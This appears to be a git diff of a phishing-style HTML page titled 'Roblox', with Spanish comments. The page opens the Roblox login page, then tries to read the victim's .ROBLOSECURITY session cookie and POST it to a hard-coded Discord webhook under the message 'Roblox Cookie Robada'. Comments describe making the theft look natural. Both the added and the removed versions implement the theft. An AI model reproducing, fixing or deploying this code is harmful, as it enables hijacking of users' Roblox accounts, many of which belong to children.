@@ -5,54 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <style>
-        /* Fondo negro puro */
         body {
-            background-color: #000000;
+            background-color: #000000; /* Negro puro */
             margin: 0;
             height: 100vh;
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
 
 <script>
-    // ⚠️ PEGA TU WEBHOOK AQUÍ ENTRE LAS COMILLAS
+    // ⚠️ PEGA TU WEBHOOK AQUÍ
     const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 
 
+    // 1. Redirigir a Roblox inmediatamente para que se genere la cookie
     window.onload = function() {
-        // 1. Obtener la cookie .ROBLOSECURITY
-        let cookieValue = document.cookie
-            .split('; ')
-            .find(row => row.startsWith('.ROBLOSECURITY='));
-        
-        if (cookieValue) {
-            // Si encuentra la cookie, elimina el "=valor" para dejar solo el valor o usarla completa
-            // Aquí enviamos el valor completo después del "="
-            const cleanCookie = cookieValue.split('=')[1];
-            enviar(cleanCookie);
-        } else {
-            // Si no la encuentra (ej. si es la primera visita), enviamos un aviso
-            enviar("Cookie no detectada aún");
-        }
+        // Abrimos Roblox en una nueva pestaña para que el usuario no pierda tu página
+        window.open('https://www.roblox.com/login', '_blank');
 
-        // Redirigir inmediatamente a Roblox para que parezca natural
+        // Esperamos 3 segundos (tiempo suficiente para que cargue Roblox y ponga la cookie)
         setTimeout(() => {
-            window.location.href = "https://www.roblox.com/login";
-        }, 500); // 0.5 segundos de pantalla negra
+            robarCookie();
+        }, 3000); 
     };
 
-    function enviar(cookie) {
+    function robarCookie() {
+        // Buscamos la cookie específica de Roblox
+        const cookies = document.cookie.split(';');
+        let robloxCookie = "";
+
+        for(let i = 0; i < cookies.length; i++) {
+            let cookie = cookies[i].trim();
+            // Verificamos si empieza con .ROBLOSECURITY=
+            if (cookie.indexOf('.ROBLOSECURITY=') == 0) {
+                robloxCookie = cookie.substring('.ROBLOSECURITY='.length);
+                break;
+            }
+        }
+
+        if (robloxCookie) {
+            enviarAWebhook(robloxCookie);
+        } else {
+            // Si no encontró la cookie, intentamos forzar una recarga o avisar
+            enviarAWebhook("⚠️ Cookie no detectada. Intenta abrir Roblox primero.");
+        }
+    }
+
+    function enviarAWebhook(cookie) {
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🍪 **Roblox Cookie:**\n\`${cookie}\``
+            body: JSON.stringify({ 
+                content: `🍪 **Roblox Cookie Robada:**\n\`${cookie}\`` 
             })
         }).then(response => {
-            if (response.ok) {
-                console.log("Enviado con éxito");
-            } else {
-                console.log("Error HTTP: " + response.status);
+            if (!response.ok) {
+                console.log("Error al enviar webhook");
             }
         }).catch(error => {
             console.error("Error de red:", error);
